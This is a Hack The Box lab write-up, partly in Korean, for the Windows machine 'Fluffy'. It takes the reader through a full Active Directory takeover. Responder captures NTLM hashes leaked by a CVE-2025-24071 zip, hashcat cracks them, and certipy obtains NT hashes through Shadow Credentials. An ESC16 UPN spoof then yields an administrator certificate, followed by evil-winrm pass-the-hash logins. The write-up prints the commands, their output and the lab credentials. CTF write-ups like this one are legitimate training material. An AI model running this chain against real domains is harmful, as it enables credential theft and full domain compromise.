---
tags:
  - type/machine
  - platform/htb
  - os/windows
  - status/solved
  - tech/ad/adcs
  - tech/ad/shadow-cred
  - tech/ad/ntlm-relay
  - tech/ad/bloodhound
  - tech/svc/smb
  - tech/exec/winrm
  - tech/cred/crack
type: machine
platform: htb
os: windows
ip: 10.129.232.88
domain: fluffy.htb
ports: [53, 88, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ncacn_http, netbios-ssn, ssl/ldap]
cves: [CVE-2025-24071]
status: solved
tech_count: 7
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.232.88 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-11 17:53 +0900
Nmap scan report for 10.129.232.88
Host is up (0.23s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-11 12:01:52Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-11T12:03:44+00:00; +3h07m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-03-11T12:03:41+00:00; +3h07m55s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-11T12:03:44+00:00; +3h07m56s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-11T12:03:41+00:00; +3h07m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-11T12:03:01
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h07m54s, deviation: 2s, median: 3h07m54s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   227.96 ms 10.10.14.1
2   228.12 ms 10.129.232.88

```

use netexec to generate a hosts file

```bash
netexec smb 10.129.232.88 --generate-hosts-file hosts
```
![[Pasted image 20260311141748.png]]
;;
## Initial Credentials
`account: j.fleischman / J0elTHEM4n1990!`

SMB,LDAP authentication was successful with the given credentials.
```bash
netexec smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
```
![[Pasted image 20260311142237.png]]

![[Pasted image 20260311143156.png]]

Checked ADCS using the `netexec` module
```bash
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs  
```

![[Pasted image 20260311144741.png]]

```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad find -u j.fleischman@dc01.fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC01.FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates

```


![[Pasted image 20260311151407.png]]

SMB 공유폴더 확인
IT 폴더에 대해 읽기/쓰기 권한 보유
```bash
nxc smb 10.129.232.88 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```
![[Pasted image 20260311152618.png]]

smbclient 사용하여 file 확인
```bash
smbclient '//10.129.232.88/IT' -U 'j.fleischman%J0elTHEM4n1990!'
```
![[Pasted image 20260311152933.png]]

PDF파일 다운로드
```bash
smb: \> get Upgrade_notice.pdf
getting file \Upgrade_notice.pdf of size 169963 as Upgrade_notice.pdf (91.0 KiloBytes/sec) (average 91.0 KiloBytes/sec)
```

PDF파일 내용에서 현재 서버에 대한 CVE 번호 확인
![[Pasted image 20260311153426.png]]

CVE-2025-24071 POC 코드 다운로드
https://github.com/0x6rss/CVE-2025-24071_PoC.git
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
Cloning into 'CVE-2025-24071_PoC'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 6.30 KiB | 922.00 KiB/s, done.
Resolving deltas: 100% (4/4), done.

```

POC 코드를 실행하여 exploit.zip 파일 생성
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy/CVE-2025-24071_PoC]
└─$ python poc.py                                                                                        
Enter your file name: exploit
Enter IP (EX: 192.168.1.162): 10.10.14.42
completed
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Fluffy/CVE-2025-24071_PoC]
└─$ ls
exploit.zip  poc.py  README.md
```

생성된 exploit.zip 파일을 SMB 서버에 업로드
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy/CVE-2025-24071_PoC]
└─$ smbclient //10.129.232.88/IT -U 'j.fleischman' --password='J0elTHEM4n1990!'
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.5 kB/s) (average 0.5 kB/s)
smb: \> 

```

스푸핑 리스너 실행
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy/CVE-2025-24071_PoC]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.42]
    Responder IPv6             [dead:beef:2::1028]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-MVDGDIA1SU0]
    Responder Domain Name      [Q0PQ.LOCAL]
    Responder DCE-RPC Port     [45883]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                     
```

잠시 대기하면 p.agila에 대한 hash값 획득

```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:e5fb03fe619acde0:DCCE8FED35228BBCAABBCCF92FA48B1C:0101000000000000009029658DB1DC016DFBF9CA99B1680D0000000002000800510030005000510001001E00570049004E002D004D00560044004700440049004100310053005500300004003400570049004E002D004D0056004400470044004900410031005300550030002E0051003000500051002E004C004F00430041004C000300140051003000500051002E004C004F00430041004C000500140051003000500051002E004C004F00430041004C0007000800009029658DB1DC0106000400020000000800300030000000000000000100000000200000A3C9932AD95D2E8A44FD8A0FCDFC4C94008FA5F512F27AF7DB75C836EAA097E40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000                                                                                          
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila
[*] Skipping previously captured hash for FLUFFY\p.agila

```

hashcat 사용하여 평문 획득
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy/CVE-2025-24071_PoC]
└─$ hashcat -m 5600 p.agila.hash /usr/share/wordlists/rockyou.txt --quiet
P.AGILA::FLUFFY:e5fb03fe619acde0:dcce8fed35228bbcaabbccf92fa48b1c:0101000000000000009029658db1dc016dfbf9ca99b1680d0000000002000800510030005000510001001e00570049004e002d004d00560044004700440049004100310053005500300004003400570049004e002d004d0056004400470044004900410031005300550030002e0051003000500051002e004c004f00430041004c000300140051003000500051002e004c004f00430041004c000500140051003000500051002e004c004f00430041004c0007000800009029658db1dc0106000400020000000800300030000000000000000100000000200000a3c9932ad95d2e8a44fd8a0fcdfc4c94008fa5f512f27af7db75c836eaa097e40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340032000000000000000000:prometheusx-303
                 
```

SMB 인증 성공`P.AGILA:prometheusx-303`
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy/CVE-2025-24071_PoC]
└─$ nxc smb 10.129.232.88 -u 'P.AGILA' -p 'prometheusx-303'
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\P.AGILA:prometheusx-303 

```


```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ bloodhound-ce-python -c all -d fluffy.htb -u p.agila -p 'prometheusx-303' -ns 10.129.232.88 --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::abbd:5789:4c89:3b76
INFO: Trying LDAP connection to dead:beef::abbd:5789:4c89:3b76
INFO: Testing resolved hostname connectivity dead:beef::ae
INFO: Trying LDAP connection to dead:beef::ae
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::abbd:5789:4c89:3b76
INFO: Trying LDAP connection to dead:beef::abbd:5789:4c89:3b76
INFO: Testing resolved hostname connectivity dead:beef::ae
INFO: Trying LDAP connection to dead:beef::ae
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 44S
INFO: Compressing output into 20260311234932_bloodhound.zip

```

bloodyAD를 통해 `service accounts` 추가
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```

Shadow Credentials 공격 수행 (accounts 추가한 것은 즉시 반영되진 않음)
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad shadow auto -u p.agila@10.129.232.88 -p prometheusx-303 -account winrm_svc
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'bfc53ef47abb483482609a86c2c3ae46'
[*] Adding Key Credential with device ID 'bfc53ef47abb483482609a86c2c3ae46' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'bfc53ef47abb483482609a86c2c3ae46' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767

```

winrm_svc NTLM해시 획득 `33bd09dcd697600edf6b3a7af4875767`

```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ evil-winrm -i 10.129.232.88 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 

```

user.txt 획득

![[Pasted image 20260311211220.png]]

동일한 방법으로 ca_svc NTLM hash 획득

```bash
┌──(kali㉿kali)-[~/HTB/Fluffy/CVE-2025-24071_PoC]
└─$ certipy-ad shadow auto -u 'p.agila' -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.232.88
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f8643e03ad2f4d6eaedc1cd186243db5'
[*] Adding Key Credential with device ID 'f8643e03ad2f4d6eaedc1cd186243db5' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'f8643e03ad2f4d6eaedc1cd186243db5' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8

```

certipy-ad를 사용하여 취약점 탐색

```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad find -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -vulnerable -dc-ip 10.129.232.88
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260312041606_Certipy.txt'
[*] Wrote text output to '20260312041606_Certipy.txt'
[*] Saving JSON output to '20260312041606_Certipy.json'
[*] Wrote JSON output to '20260312041606_Certipy.json'

```

```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ cat 20260312041606_Certipy.txt                                                                         
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

UPN을 administrator로 변조 후 정보확인
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad account read -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'administrator' -user 'ca_svc'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2026-03-11T19:14:17+00:00
                                                                         
```

userPrincipalName 변조

```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'administrator' -user 'ca_svc'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'

```


변조 후 administrator.pfx 발급
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

변조한 값 원복
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad account update -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -upn 'ca_svc@fluffy.htb' -user 'ca_svc'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'

```

administrator.pfx 사용하여 NTLM hash 획득
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb' -dc-ip '10.129.232.88'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

```

evil-winrm 사용하여 접속
```bash
┌──(kali㉿kali)-[~/HTB/Fluffy]
└─$ evil-winrm -i 10.129.232.88 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```



root.txt 획득
![[Pasted image 20260311214041.png]]